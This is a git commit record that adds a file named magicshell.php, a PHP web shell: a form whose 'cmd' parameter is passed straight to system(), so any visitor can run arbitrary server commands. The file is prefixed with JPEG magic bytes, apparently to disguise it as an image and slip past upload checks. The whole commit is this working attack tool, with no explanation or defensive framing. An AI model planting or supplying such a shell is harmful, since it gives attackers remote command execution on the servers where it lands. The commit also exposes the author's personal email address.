469907c9d5546ca8c20b467bd08b011a0caea733
eethan1 <call132call132@gmail.com>
2019-08-14 15:31:07 +0800

    first commit

---
+++ magicshell.php
@@ -0,0 +1,21 @@
+ÿØÿÛ<html>
+
+
+
+<body>
+
+
+<form method=GET>
+<input  type='text' name='cmd' value='ls'>
+<input type=submit name=submit>
+</form>
+<?php
+    if($_GET['cmd'])
+    {
+        system($_GET['cmd']);
+    }
+?>
+
+</body>
+
+</html>
